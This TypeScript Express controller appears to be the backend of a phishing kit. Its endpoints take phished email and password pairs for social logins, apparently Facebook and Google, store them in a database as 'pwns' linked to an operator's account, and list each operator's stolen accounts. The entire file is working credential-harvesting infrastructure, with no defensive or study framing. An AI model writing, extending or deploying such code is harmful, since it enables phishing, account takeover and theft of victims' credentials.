import { Request, Response } from "express";
/*    - face          -> `GET` `POST` `PUT` `DELETE` after obtaining phised creds
    - goog          -> `GET` `POST` `PUT` `DELETE` after obtaining phised creds */
import Social from "../models/Social";
import { BadRequestError } from "../errors/bad-request";
import { CustomAPIError } from "../errors/custom-api";
import { StatusCodes as Code } from "http-status-codes";
import {
    // SocialLogin,
    SocialLoginTypes,
    // SocialNames,
    SocialNamesTypes,
} from "../utils/types";
import { userInfo } from "./user";

export const allsocial = async (req: Request, res: Response) => {
    res.json({ SocialLoginTypes, SocialNamesTypes });
};

export const newPwn = async (req: Request, res: Response) => {
    const { socialName, socialType, user_id, phis_mail, phis_pass } = req.body;
    try {
        if (
            !socialName ||
            !socialType ||
            !user_id ||
            !phis_mail ||
            !phis_pass
        ) {
            throw new BadRequestError("Fill all the required fields!");
        }
        if (SocialNamesTypes.includes(socialName) === false) {
            throw new BadRequestError("Invalid Social Name!");
        }
        if (SocialLoginTypes.includes(socialType) === false) {
            throw new BadRequestError("Invalid Social Type!");
        }
        const userExist = await userInfo(user_id);
        if (!userExist) {
            throw new BadRequestError("User not found!");
        }

        const pwn = new Social({
            name: socialName,
            type: socialType,
            user: userExist,
            phis_mail,
            phis_pass,
        });
        const pwned = await pwn.save();
        console.log(`${pwned.name}, ${pwned.type} type Pwn Successfull.`);
        res.status(Code.CREATED).json({
            msg: `${pwned.name} Pwn Successfull.`,
        });
    } catch (error: any) {
        console.log(error);
        throw new CustomAPIError(error.message || error.name || error.msg);
    }
};

export const pwnedSocials = async (req: Request, res: Response) => {
    const { uuid } = req.body.user;
    try {
        const userExist = await userInfo(uuid);
        if (!userExist) {
            throw new BadRequestError("User not found!");
        }
        // all the pwns of the user
        const pwns = await Social.find({ user: userExist });
        if (pwns.length === 0) {
            return res.status(Code.NOT_FOUND).json({
                msg: "No Pwns found!",
            });
        }
        res.status(Code.OK).json({
            msg: "Pwns found!",
            pwns,
        });
    } catch (error: any) {
        console.log(error);
        return res
            .status(Code.INTERNAL_SERVER_ERROR)
            .json({ msg: error.message });
    }
};
